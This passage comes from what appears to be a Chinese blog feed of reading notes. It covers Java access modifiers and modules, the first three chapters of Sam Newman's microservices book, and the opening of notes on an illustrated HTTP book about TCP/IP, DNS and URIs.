id="7.1.4-%E7%94%A8-import-%E6%9D%A5%E6%94%B9%E5%8F%98%E8%A1%8C%E4%B8%BA" tabindex="-1">7.1.4　用 import 来改变行为</h4><ul><li><p>Java 缺少的一个功能是 C 语言的<strong>条件编译（conditional compilation）</strong>，你可以通过更改一个开关设置来获得不同的行为，而无须更改任何其他代码。</p></li><li><p>没有的原因</p><ul><li>C中这一功能最常用于解决跨平台问题：根据目标平台来编译代码的不同部分</li><li>Java 旨在自动跨平台，因此不需要这样的功能</li></ul></li><li><p>但是条件编译还有其他用途。比如调试代码，在开发中启用该功能，发布的产品中禁用</p></li></ul><h3 id="7.2-java-%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6" tabindex="-1">7.2 Java 访问权限修饰符</h3><h4 id="7.2.1-%E5%8C%85%E8%AE%BF%E9%97%AE" tabindex="-1">7.2.1 包访问</h4><ul><li>默认访问权限没有关键字，通常称为<strong>包访问权限</strong>（有时称为“友好访问权限”）。</li><li>这意味着当前包中的所有其他类都可以访问该成员。对于此包之外的所有类，该成员显示为 private。包访问权限将相关的类分组到一个包中，以便它们可以轻松地交互。</li><li>一个编译单元（即一个文件）只能属于一个包，所以一个编译单元中的所有<br>类都可以通过包访问权限来相互访问。</li><li><strong>默认包</strong>：当在统同一目录下的文件未声明包时，Java 将这样的文件看作属于该目录的“默认包”的隐含部分，因此它们为该目录中所有其他文件提供了包访问权限。</li></ul><h4 id="7.2.2-public%EF%BC%9A%E6%8E%A5%E5%8F%A3%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90" tabindex="-1">7.2.2 public：接口访问权限</h4><ul><li>public 后面的成员声明对于所有人都是可用的</li></ul><h4 id="7.2.3-private%EF%BC%9A%E4%BD%A0%E6%97%A0%E6%B3%95%E8%AE%BF%E9%97%AE%E5%AE%83" tabindex="-1">7.2.3 private：你无法访问它</h4><ul><li>只有当前类的成员可以访问</li><li>只要能确定是类的“辅助”方法，这个方法就可以设为 private，以确保在包的其他地方不会意外地使用它，从而让自己无法再更改或删除。</li></ul><h4 id="7.2.4-protected%EF%BC%9A%E7%BB%A7%E6%89%BF%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90" tabindex="-1">7.2.4 protected：继承访问权限</h4><ul><li>protected 关键字处理的是继承的概念，它利用一个现有类—我们叫作基类（base class）—并在不修改现有类的情况下向该类添加新成员，还可以改变该类现有成员的行为。</li><li>为了继承一个类，需要声明新类，通过关键字 extends 扩展了现有类</li></ul><pre><code class="language-java">class Foo extends Bar &#123;</code></pre><ul><li>基类的创建者想要把特定成员的访问权限赋给子类，而不是所有的类，这时候可以通过protected关键字</li><li>protected包括了包访问权</li></ul><h4 id="7.2.5-%E5%8C%85%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%E4%B8%8E%E5%85%AC%E5%85%B1%E6%9E%84%E9%80%A0%E5%99%A8" tabindex="-1">7.2.5　包访问权限与公共构造器</h4><ul><li>在<strong>只有包访问权限的类中</strong>声明一个 public 构造器是不合法的，编译器会将其标记为错误。<ul><li>这是因为在 Java 中，包访问权限（也称为默认访问权限）是指只有同一个包中的其他类可以访问该类或其成员。如果在只有包访问权限的类中声明一个 public 构造器，那么这个构造器将可以被其他包中的类访问，违反了包访问权限的规则。</li><li>为了修复这个错误，应该将构造器的访问权限设置为包访问权限（默认访问权限），或者将该构造器放在另一个具有 public 访问权限的类中。这样，只有同一个包中的类才能访问这个构造器。</li></ul></li></ul><h3 id="7.3-%E6%8E%A5%E5%8F%A3%E5%92%8C%E5%AE%9E%E7%8E%B0" tabindex="-1">7.3 接口和实现</h3><ul><li><p>访问控制常常被称为实现隐藏。将数据和方法包装在类中，并与实现隐藏相结合，称为封装（encapsulation）A。其结果就是具有特征和行为的数据类型</p></li><li><p>访问权限控制在数据类型的内部设置了访问边界的两个原因</p><ul><li><ol><li>确定客户程序员可以使用和不可以使用的内容</li></ol></li><li><ol start="2"><li>将接口与实现分离</li></ol></li></ul></li></ul><h3 id="7.4-%E7%B1%BB%E7%9A%84%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90" tabindex="-1">7.4 类的访问权限</h3><ul><li><p>访问权限修饰符可以出现在关键字 class 之前，实现对类的访问权限的控制</p></li><li><p>限制</p><ul><li>每个编译单元(文件)只能有一个public类<ul><li>每个编译单元都有一个由该 public类表示的公共接口。</li><li>它可以根据需要拥有任意数量的包访问权限的类。</li></ul></li><li>public类的名称必须和包含编译单元的文件名相匹配，包括大小写<ul><li>当然，编译单元里可以没有 public 类，这时可以随意命名文件，但会为阅读和维护代码的人带来困扰</li></ul></li></ul></li><li><p>创建包访问权限的类时</p><ul><li>将类的字段需要设置为包访问或者private</li><li>public字段只有在强制的场景才能设置，否则与包访问的概念相冲突</li></ul></li><li><p>类不能是private或protected的</p><ul><li>因此类只能是public或包访问</li><li>如果需要防止对类的访问，可以将构造器设置为private，从而禁止其他人创建该类的对象，而你则可以在这个类的静态方法中创建对象</li></ul></li></ul><h3 id="7.5-%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%9A%E6%A8%A1%E5%9D%97" tabindex="-1">7.5 新特性：模块</h3><ul><li>在 JDK 9 之前，Java 程序会依赖整个 Java 库。这意味着即使最简单的程序也带有大量从未使用过的库代码</li><li>JDK 9 最终引入了模块（module）：Java 库设计者现在可以将代码清晰地划分为模块，这些模块以编程的方式指定它们所依赖的每个模块，并定义导出哪些组件以及哪些组件完全不可用。。<ul><li>当使用库组件时，你会仅仅获得该组件的模块及其依赖项，不会有不使用的模块。</li><li>如果想继续使用隐藏的库组件，你必须启用“逃生舱口”（escape hatch），未来隐藏的库组件变更引发的问题都需要自己承担</li></ul></li></ul><h3 id="7.6-%E6%80%BB%E7%BB%93" tabindex="-1">7.6　总结</h3><ul><li><p>本章研究了类如何生成，以方便构建库：</p><ul><li>首先，介绍了一组类是如何被打包到一个库里的；</li><li>其次，介绍了类是如何控制对其成员的访问的。</li></ul></li><li><p>据估计，用 C 语言开发的项目，当代码量达到 5 万 ~10 万行时就会出现问题，因为C 语言只有单一的命名空间，这时候名称就开始冲突，导致额外的管理开销。</p></li><li><p>在 Java 中，通过 package 关键字、包命名方案和 import 关键字，你可以完全控制名称，因此很容易避免名称冲突的问题。</p></li><li><p>控制对成员的访问权限有两个原因</p><ul><li><ol><li>让用户远离他们不应该接触的部分</li></ol></li><li><ol start="2"><li>让库设计者可以改变类的内部实现，而不必担心会影响到客户程序员</li></ol></li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微服务设计</title>
      <link href="/2023/06/18/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1/"/>
      <url>/2023/06/18/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1/x-x.jpg" alt><br>[toc]<br>本文章为阅读这 微服务设计[美]Sam Newman 一书籍的读书笔记</p><h2 id="%E7%AC%AC1%E7%AB%A0-%E5%BE%AE%E6%9C%8D%E5%8A%A1" tabindex="-1">第1章 微服务</h2><h3 id="1.1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%BE%AE%E6%9C%8D%E5%8A%A1" tabindex="-1">1.1 什么是微服务</h3><p>微服务就是一些协同工作的小而自治的服务</p><h4 id="1.1.1-%E5%BE%88%E5%B0%8F%EF%BC%8C%E4%B8%93%E6%B3%A8%E4%BA%8E%E5%81%9A%E5%A5%BD%E4%B8%80%E4%BB%B6%E4%BA%8B" tabindex="-1">1.1.1 很小，专注于做好一件事</h4><ul><li><p>单一职责原则：把因相同原因而变化的东西聚合在一起，把因不同原因而变化的东西分离开来（Robert C.Martin）</p><ul><li>在代码层面：代码的内聚性</li><li>在服务层面：微服务</li></ul></li><li><p>服务越小，微服务架构的优点和缺点也越明显</p><ul><li>服务越小，带来的独立性的好处多但管理大量服务也会越复杂</li></ul></li></ul><h4 id="1.1.2-%E8%87%AA%E6%B2%BB%E6%80%A7" tabindex="-1">1.1.2 自治性</h4><ul><li>一个微服务就是一个独立的实体。它可以独立地部署在PAAS上，也可以作为一个操作系统进程存在。</li><li>但我们应该尽量避免把多个服务部署到同一个机器上，尽管这种隔离性会引发一些代价，但它能够大大简化分布式系统的构建</li><li>服务之间均通过网络调用进行通信，从而加强服务之间的隔离性，避免紧耦合</li><li>服务会暴露出API（Application Programming Interface 应用编程接口），然后服务之间通过这些API进行通信。API的实现技术应该避免和消费方耦合。</li><li>为了达到解耦的目的，需要正确地建模服务和API</li></ul><h3 id="1.2-%E4%B8%BB%E8%A6%81%E5%A5%BD%E5%A4%84" tabindex="-1">1.2 主要好处</h3><h4 id="1.2.1-%E6%8A%80%E6%9C%AF%E5%BC%82%E6%9E%84%E5%9E%8B" tabindex="-1">1.2.1 技术异构型</h4><ul><li><p>在多服务协作的系统中，可以在不同的服务中使用最适合该服务的技术，尝试使用一种适用所有场景的标准化技术，会使所有场景都得不到好的支持</p><ul><li>例如：不同服务可以使用不同的数据库<img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1/1-1.jpg" alt></li></ul></li><li><p>微服务可以帮助我们更快地采用新技术，并且理解到新技术地好处</p></li><li><p>为了同时使用多种技术，会付出代价，比如一些组织会限制语言的选择，比如网飞和推特地技术基于JVM</p></li><li><p>贯穿本书地一个问题：微服务如何寻找平衡</p><ul><li>第2章将会讨论如何做技术选择，其中主要专注于演进式架构</li><li>第4章主要关注继承，将讨论如何避免服务间的过度耦合，从而可以彼此独立地进行技术演化</li></ul></li></ul><h4 id="1.2.2-%E5%BC%B9%E6%80%A7" tabindex="-1">1.2.2 弹性</h4><ul><li>在单块服务系统中，如果服务不可用，那么所有功能不可用。<ul><li>可以通过将同样的实例运行到不同地机器上来降低功能完全不可用的概率</li></ul></li><li>然而微服务系统本身就能很好地处理服务的不可用和功能降级问题</li></ul><h4 id="1.2.3-%E6%89%A9%E5%B1%95" tabindex="-1">1.2.3 扩展</h4><ul><li>庞大的单体服务，即便只有一小部分存在性能问题，也需要对整个服务进行扩展，如果使用较小的多个服务，则可以只对需要扩展的服务进行扩展</li></ul><h4 id="1.2.4-%E7%AE%80%E5%8C%96%E9%83%A8%E7%BD%B2" tabindex="-1">1.2.4 简化部署</h4><ul><li>单体服务中，部署频率低，意味着两次发布之间软件有很多的功能增强，此时两次发布之间的差异越大，出错的机率越高</li><li>微服务架构中，各个服务的部署是独立的，可以针对特定服务进行单个部署。如果真出了问题，只影响一个服务，且容易回滚</li></ul><h4 id="1.2.5-%E4%B8%8E%E7%BB%84%E7%BB%87%E6%9E%B6%E6%9E%84%E7%9B%B8%E5%8C%B9%E9%85%8D" tabindex="-1">1.2.5 与组织架构相匹配</h4><ul><li>微服务架构可以很好地将架构和组织架构相匹配，避免出现过大地代码库，从而获得理想的团队大小和生产力，服务的所有权也更好地可以在团队之间迁移，从而避免异地团队地出现。</li></ul><h4 id="1.2.6-%E5%8F%AF%E7%BB%84%E5%90%88%E6%80%A7" tabindex="-1">1.2.6 可组合性</h4><ul><li>在微服务架构中，根据不同的目的，人们可以通过不同的方式使用同一个功能，在考虑用户如何使用该软件时这一点尤为重要。</li><li>单纯考虑桌面网站或移动应用程序的时代已经过去了，现在需要考虑的程序种类有 Web，原生应用，移动端Web，平板应用以及可穿戴设备等</li><li>因此针对每一种程序都需要考虑已有功能组合来实现这些应用</li><li>在微服务架构中，系统会提供很多接缝供外部使用，当情况发生变化时，可以使用不同的方式构建应用，而整体化应用程序只能提供一个非常粗粒度的接缝供外部使用</li></ul><h4 id="1.2.7-%E5%AF%B9%E5%8F%AF%E6%9B%BF%E4%BB%A3%E6%80%A7%E7%9A%84%E4%BC%98%E5%8C%96" tabindex="-1">1.2.7 对可替代性的优化</h4><ul><li>历史遗留系统，可能使用Fortran变体编写，且运行在几十年前就应该被淘汰的硬件上，但以为工作量大，而且风险很高，至今仍在运行</li><li>而在微服务架构中，可以轻易地重写服务或删除不再使用的服务</li></ul><h3 id="1.3-%E9%9D%A2%E5%90%91%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%9E%B6%E6%9E%84" tabindex="-1">1.3 面向服务的架构</h3><ul><li><p>SOA（Service-Oriented Architecture，面向服务的架构）是一种设计方法，其中包含多个服务，而服务之间通过配合最终会提供一系列功能。</p></li><li><p>一个服务通常以独立的形式存在于操作系统进程中，服务之间通过网络调用，而非采用进程内调用的方式进行通信</p></li><li><p>实施SOA时会遇到很多问题</p><ul><li>通讯协议(如SOAP)如何选择</li><li>第三方中间件如何选择</li><li>服务粒度如何确定</li></ul></li><li><p>就像认为XP或者Scrum是敏捷软件开发的一种方法一样，微服务架构也可以是SOA的一种特定方式</p></li></ul><h3 id="1.4-%E5%85%B6%E4%BB%96%E5%88%86%E8%A7%A3%E6%8A%80%E6%9C%AF" tabindex="-1">1.4 其他分解技术</h3><ul><li>基于微服务架构主要有两个优势<ul><li><ol><li>具有较小的粒度</li></ol></li><li><ol start="2"><li>能够在解决问题的方法上给予你更多的选择</li></ol></li></ul></li></ul><h4 id="1.4.1-%E5%85%B1%E4%BA%AB%E5%BA%93%E6%8A%80%E6%9C%AF" tabindex="-1">1.4.1 共享库技术</h4><ul><li>基本上所有的语言都支持将整个代码库分解为多个库，这是一种非常标准的分解技术，库可以由第三方或者自己组织提供</li><li>存在缺点：<ul><li><ol><li>无法选择异构的技术</li></ol><ul><li>一般来讲，一种库中只能存在一种语言，或者至少在同一个平台上使用</li></ul></li><li><ol start="2"><li>会失去独立地对系统某一部分进行扩展的能力，除非是用的是动态链接库，否则每次当库有更新的时候，都需要重新部署整个进程</li></ol></li><li><ol start="3"><li>最糟糕的影响：缺少一个比较明显的接缝来建立架构的安全性保护措施，从而无法保证系统的弹性</li></ol></li></ul></li></ul><h4 id="1.4.2-%E6%A8%A1%E5%9D%97" tabindex="-1">1.4.2 模块</h4><ul><li>有些语言提供了模块分解技术，允许对模块进行生命周期管理，这样就可以把模块部署到运行的进程中，并且可以在不停止整个进程的前提下对某个模块进行更改</li><li>模块分解技术<ul><li>OSGI（Open Source Gateway Initiative,开放服务网关协议）</li><li>Erlang</li></ul></li><li>缺点与共享库类似：大大限制我们采用新技术和独立队服务进行扩展的能力，且有可能会导致使用过度耦合的集成技术，同时也缺乏相应的接缝来进行架构的安全性保护</li></ul><h3 id="1.5-%E6%B2%A1%E6%9C%89%E9%93%B6%E5%BC%B9-%26-1.6-%E5%B0%8F%E7%BB%93" tabindex="-1">1.5 没有银弹 &amp; 1.6 小结</h3><ul><li>微服务不是免费的午餐，更不是银弹，如果你想要得到一条通用准则，那么微服务是一个错误的决定</li><li>到目前为止，已经了解到<ul><li>什么是微服务</li><li>微服务和其他组合技术有什么不同</li><li>微服务的好处</li></ul></li><li>后续将讨论如何得到这些好处及如何避免一些常见的陷阱</li></ul><h2 id="%E7%AC%AC2%E7%AB%A0-%E6%BC%94%E5%8C%96%E5%BC%8F%E6%9E%B6%E6%9E%84%E5%B8%88" tabindex="-1">第2章 演化式架构师</h2><ul><li>本章中架构师职责的观点是作者个人简介，其希望能对象牙塔中的定义发起攻击</li></ul><h3 id="2.1-%E4%B8%8D%E5%87%86%E7%A1%AE%E7%9A%84%E6%AF%94%E8%BE%83" tabindex="-1">2.1 不准确的比较</h3><ul><li>计算机行业很年轻，因此社会很难理解我们，我们也不清楚自己到底在干什么</li><li>所以我们尝试借鉴其他行业，把自己称作软件“工程师”或建筑师，然而，建筑师和工程师所具有的精确性和纪律性是遥不可及的。在英国至少需要7年才能成为建筑师，而很多IT证书并没有什么价值。</li><li>有些人想要得到认可，所以借鉴了这些广为人知的行业中的名词，这样借鉴也会造成两个问题<ul><li>首先，这么做的前提是我们应该清楚自己应该是干什么的，而事实并非如此<ul><li>建筑和桥梁倒塌的次数远比程序崩溃的次数少，所以和工程师比是不公平的</li></ul></li><li>其次，这种类比很奇怪<ul><li>如果将桥梁建筑和编程类似的话，那么建到一半可能会发现对岸比预想的要远50米，而且材质是花岗岩而不是泥土。</li></ul></li><li>事实上，我们要创造的东西从设计上来说就要足够灵活，有很好的适应性，并且能够根据用户的需求进行演化</li></ul></li><li>如今架构师的定义逐渐被人接受，本书将尽力去重定义它</li></ul><h3 id="2.2-%E6%9E%B6%E6%9E%84%E5%B8%88%E7%9A%84%E6%BC%94%E5%8C%96%E8%A7%86%E8%A7%92" tabindex="-1">2.2 架构师的演化视角</h3><ul><li>与建筑师相比，在软件中有大量的需求变更，使用的工具和技术既有多样性。</li><li>一个角色可以和架构师相类比：城市规划师</li><li>架构师的职责之一就是保证该系统的开发人员适合在其上工作</li></ul><h3 id="2.3-%E5%88%86%E5%8C%BA" tabindex="-1">2.3 分区</h3><ul><li>与城市规划师类比<ul><li>区域-服务</li><li>应更多关注服务之间的事情，而不是服务内部</li></ul></li></ul><h3 id="2.4-%E4%B8%80%E4%B8%AA%E5%8E%9F%E5%88%99%E6%80%A7%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">2.4 一个原则性的方法</h3><ul><li><p>做系统设计方面的决定通常是在取舍，而在微服务架构中，需要更多的取舍</p></li><li><p>战略目标：架构师不需要定义战略目标，战略目标关心的是公司的走向以及如何让公司满意，这些目标的层次都比较高，但通常不会涉及技术层面</p></li><li><p>原则：为了和大目标保持一致，我们会指定一些具体的规则，称为原则，但原则并不是一成不变的</p></li><li><p>实践：我们通过实践来保证原则能够得到实施，这些实践能指导我们如何完成任务。</p><ul><li>通常实践是技术相关的，而且是底层的，包括代码规范，日志数据集集中捕获等</li><li>实践应该巩固原则</li></ul></li><li><p>将原则和实践相结合</p><ul><li>原则和实践是相对的，比如，可以把使用HTTP/REST作为原则而不是实践，但关键是要有一些重要的原则来指导系统的演化</li></ul></li><li><p>真实世界的例子<img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1/2-1.jpg" alt></p><ul><li>几年间，时间变动很频繁，而原则基本没有变</li><li>上面提到的名词可以使用文档来职场，也可以提供示例代码，搞好的方法是创造工具保证事情的正确性</li></ul></li></ul><h3 id="2.5-%E8%A6%81%E6%B1%82%E7%9A%84%E6%A0%87%E5%87%86" tabindex="-1">2.5 要求的标准</h3><ul><li><p>系统应该由很多小但有生命周期的组件构成，这些组件之间有着紧密的联系。</p></li><li><p>所以在优化单个服务自治性的同时，也要兼顾全局，一种能帮我们实现平衡的方法就是，清楚地定义出一个好服务应有的属性</p></li><li><p>监控</p><ul><li>能够清晰地描绘出跨服务系统的健康状态十分关键，这必须在系统级别而非单个服务级别进行考虑</li><li>建议所有的服务使用同样的方式报告健康状态及其监控的数据</li></ul></li><li><p>接口：选用少数几种明确的接口技术有助于使用者的集成。</p></li><li><p>架构安全性：一个运行异常的服务可能毁了整个系统，因此要保证每个服务可以应对下游服务的错误请求。</p></li></ul><h3 id="2.6-%E4%BB%A3%E7%A0%81%E6%B2%BB%E7%90%86" tabindex="-1">2.6 代码治理</h3><ul><li><p>达成共识的方法：</p></li><li><p>范例：提供代码范例，当系统中有好的代码范例时，开发人员也不会错得离谱</p><ul><li>理想情况下，提供的优秀范例应当来自真是项目，而不是专门实现的完美例子</li></ul></li><li><p>裁剪服务代码模板</p><ul><li>当开发人员想要实现一个新的服务时，所有实现核心属性的那些代码应该是现成的</li><li>针对自己的开发实践裁剪出一个服务代码模板，不但可以开发出开发速度，还可以保证服务的质量<ul><li>针对不同技术栈，都需要一个服务代码模板</li></ul></li></ul></li></ul><h3 id="2.7-%E6%8A%80%E6%9C%AF%E5%80%BA%E5%8A%A1" tabindex="-1">2.7 技术债务</h3><ul><li>有时为了实现紧急的特性，可能会忽略一些约束，短期内可能会获得利益，但长期是会付出代价的，这就是技术债务。</li><li>系统的目标发生变化时，且与现有事实不符，此时也会产生技术债务</li></ul><h3 id="2.8-%E4%BE%8B%E5%A4%96%E7%AE%A1%E7%90%86" tabindex="-1">2.8 例外管理</h3><ul><li>当系统偏离指导会发生什么？<ul><li>有时候我们会针对某个规则破一次例，然后把他们记录下来。如果这个例外出现了很多次，那就可以通过修改原则和实践的方法把我们的理解固化下来。</li></ul></li></ul><h3 id="2.9-%E9%9B%86%E4%B8%AD%E6%B2%BB%E7%90%86%E5%92%8C%E9%A2%86%E5%AF%BC" tabindex="-1">2.9 集中治理和领导</h3><ul><li><p>架构师的部分职责时治理：</p><ul><li>治理通过评估干系人的需求，当前情况及下一步的可能性来确保企业目标的达成，通过排优先级和做决策来设定方向，对于已经达成一致的方向和目标进行监督</li></ul></li><li><p>架构师的一个职责是确保有一个技术愿景，那么治理就是要确保我们构建的系统符合这个愿景，必要时应对愿景进行演化。</p></li><li><p>架构师需要确保有一组可以指导开发的原则，且这些原则要与组织的战略相符</p><ul><li>他们还需要确保，以这些原则为指导衍生出来的实践不会给开发人员带来痛苦。</li></ul></li><li><p>此时可以成立一个治理小组，小组由技术专家领导，且有一线人员</p><ul><li>一种模式是架构师领导这个小组，每个交付团队都有人参加，架构师负责确保该组织的正常运作，整个小组对治理负责</li></ul></li></ul><h3 id="2.10-%E5%BB%BA%E8%AE%BE%E5%9B%A2%E9%98%9F" tabindex="-1">2.10 建设团队</h3><ul><li><p>对于一个系统技术愿景的主要负责人来说，执行愿景不仅仅等同于做技术决定，和你在一起工作的人自然会做出技术决定</p></li><li><p>对于技术领导者来说，更重要的是帮助你的队友成长，帮助他们理解这个愿景，并保证他们可以积极地参与到愿景的实现和调整中去。</p></li><li><p>在单块系统中，人们为某些事情负责的机会非常少，而在微服务架构种存在多个自治的代码看，每个代码库有自己独立的生命周期，这给更多人提供了对单个服务负责的机会。帮助他们成长，同时通过分担责任也可以防止某一个人负担过重</p></li></ul><h3 id="2.11-%E6%84%BF%E6%99%AF" tabindex="-1">2.11 愿景</h3><ul><li><p>本书认为一个演进式架构师应承担的责任</p><ul><li>愿景<ul><li>确保在系统级有一个经过充分沟通的技术愿景，这个愿景应该可以帮助你满足客户和组织的需求</li></ul></li><li>同理心<ul><li>理解你所做的决定的客户和同时带来的影响</li></ul></li><li>合作<ul><li>和尽量多的同事进行沟通，从而更好地对愿景进行定义，修订及执行</li></ul></li><li>适应性<ul><li>确保在你的客户和组织需要的时候调整技术愿景</li></ul></li><li>自治性<ul><li>在标准化和团队自制之间寻找一个正确的平衡点</li></ul></li><li>治理<ul><li>确保系统按照技术愿景执行</li></ul></li></ul></li><li><p>在下一章，让我们带着对架构师的认识开始寻找微服务之间的正确边界</p></li></ul><h2 id="%E7%AC%AC3%E7%AB%A0-%E5%A6%82%E4%BD%95%E5%BB%BA%E6%A8%A1%E6%9C%8D%E5%8A%A1" tabindex="-1">第3章 如何建模服务</h2><h3 id="3.1-musiccorp%E7%AE%80%E4%BB%8B" tabindex="-1">3.1 MusicCorp简介</h3><ul><li>讨论想法的书最好有例子辅助，本书例子 在线零售商Musiccorp.</li><li>MusicCorp最初是实体店经营，在唱片收益跌入谷底后将注意力放到了网上</li><li>它认为赢得世界的方法是，保证自己很容易对应用进行修改，这正是微服务的用武之处</li></ul><h3 id="3.2-%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%98%AF%E5%A5%BD%E6%9C%8D%E5%8A%A1" tabindex="-1">3.2 什么样的服务是好服务</h3><h4 id="3.2.1-%E6%9D%BE%E8%80%A6%E5%90%88" tabindex="-1">3.2.1 松耦合</h4><ul><li><p>实现松耦合，那么修改一个服务就不需要修改另一个服务</p></li><li><p>使用微服务的最重要一点：能够独立修改和部署单个服务而不需要修改系统的其他部分</p></li><li><p>紧耦合的原因</p><ul><li>使用紧耦合的方式做服务间的集成</li><li>过度的服务间的通信可能会导致紧耦合</li></ul></li></ul><h4 id="3.2.2-%E9%AB%98%E5%86%85%E8%81%9A" tabindex="-1">3.2.2 高内聚</h4><ul><li><p>内聚原因：改变某一行为时，只在一个地方进行修改，然后尽快发布</p></li><li><p>否则，需要同时发布多个微服务才能交付这个功能</p></li><li><p>找到问题域的边界就可以确保相关的行为能发在同一个地方，并且他们会和其它边界尽量以松耦合的形式进行通信</p></li></ul><h3 id="3.3-%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87" tabindex="-1">3.3 限界上下文</h3><ul><li>在Eric Evans的领域驱动设计中，Evans引入了 限界上下文的概念<ul><li>他任务一个给定的领域包含多个限界上下文，每个限界上下文中的模型分成两部分，一部分需要和外部通信，另一部分不需要</li><li>每个上下文都有明确的的接口，接口决定了它会暴露那些模型给其他上下文</li></ul></li><li>另一个限界上下文的定义：一个由显示边界限定的特定职责</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图解HTTP</title>
      <link href="/2023/06/18/web/%E5%9B%BE%E8%A7%A3HTTP/"/>
      <url>/2023/06/18/web/%E5%9B%BE%E8%A7%A3HTTP/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/x_x.jpg" alt></p><p>本文章为阅读图解HTTP（上野宣）这一书籍的读书笔记</p><h2 id="%E7%AC%AC%E4%B8%80%E7%AB%A0-%E4%BA%86%E8%A7%A3web%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80" tabindex="-1">第一章 了解Web及网络基础</h2><ul><li>Web通过一种名为HTTP（HyperText Transfer Protocol，超文本传输协议）作为规范，完成客户端到服务器端的一系列运行流程</li></ul><h3 id="1-tcp%2Fip" tabindex="-1">1 TCP/IP</h3><ul><li><p>TCP/IP协议族，分为4层</p><ul><li>应用层：向用户提供应用服务时通信的活动。<ul><li>协议：FTP（File Transfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统），HTTP</li></ul></li><li>传输层：对上层应用层，提供处于网络连接中的两台计算机之间的数据传输<ul><li>协议：TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）</li></ul></li><li>网络层：用来处理在网络上流动的数据包。数据包是网络传输的最小数据单位。<ul><li>该层规定了通过怎样的路径（所谓的传输路线）到达对方计算机，并把数据包传送给对方。</li></ul></li><li>链路层（又名数据链路层，网络接口层）：用来处理连接网络的硬件部分。<ul><li>包括控制操作系统、硬件的设备驱动、NIC（Network Interface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。</li></ul></li></ul></li><li><p>TCP/IP通信传输流</p><ul><li><img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/1_1.jpg" alt></li><li>发送端在层与层之间传输数据时，每经过一层时必定会被打上一个该层所属的首部信息。反之，接收端在层与层传输数据时，每经过一层时会把对应的首部消去。</li><li>这种把数据信息包装起来的做法称为封装（encapsulate）</li></ul></li></ul><h3 id="2-%E4%B8%8E-http-%E5%85%B3%E7%B3%BB%E5%AF%86%E5%88%87%E7%9A%84%E5%8D%8F%E8%AE%AE%EF%BC%9Aip%E3%80%81tcp-%E5%92%8C-dns" tabindex="-1">2 与 HTTP 关系密切的协议：IP、TCP 和 DNS</h3><ul><li><p>负责传输的IP协议</p><ul><li>IP（Internet Protocol）网际协议位于网络层。</li><li>IP 协议的作用是把各种数据包传送给对方。而要保证确实传送到对方那里，则需要满足各类条件。其中两个重要的条件是 IP 地址和 MAC地址（Media Access Control Address）</li><li>IP 地址指明了节点被分配到的地址，MAC 地址是指网卡所属的固定地址。IP 地址可以和 MAC 地址进行配对。IP 地址可变换，但 MAC地址基本上不会更改</li><li>使用 ARP 协议凭借 MAC 地址进行通信：ARP 是一种用以解析地址的协议，根据通信方的 IP 地址就可以反查出对应的 MAC 地址。</li><li>在到达通信目标前的中转过程中，那些计算机和路由器等网络设备只能获悉很粗略的传输路线。这种机制称为路由选择（routing）</li></ul></li><li><p>确保可靠性的TPC协议</p><ul><li>TCP 位于传输层，提供可靠的字节流服务。<ul><li>字节流服务（Byte Stream Service）是指，为了方便传输，将大块数据分割成以报文段（segment）为单位的数据包进行管理。</li><li>可靠的传输服务是指，能够把数据准确可靠地传给对方。</li><li>为了准确无误地将数据送达目标处，TCP 协议采用了三次握手（three-way handshaking）策略。<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/1_2.jpg" alt></li></ul></li></ul></li><li><p>负责域名解析的DNS服务</p><ul><li>应用层协议，提供域名到 IP 地址之间的解析服务。</li></ul></li><li><p>HTTP协议和各个协议的关系：<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/1_3.jpg" alt></p></li></ul><h3 id="3-uri%E5%92%8Curl" tabindex="-1">3 URI和URL</h3><ul><li><p>URI（Uniform Resource Identifier，统一资源标识符）</p></li><li><p>URL（Uniform Resource Locator，统一资源定位符）</p></li><li><p>URL 是 URI 的子集</p></li><li><p>URI格式</p><ul><li>绝对URI格式：<img src="/images/web/%E5%9B%BE%E8%A7%A3HTTP/1_4.jpg" alt></li><li>协议方案名：<ul><li>使用 http: 或 https: 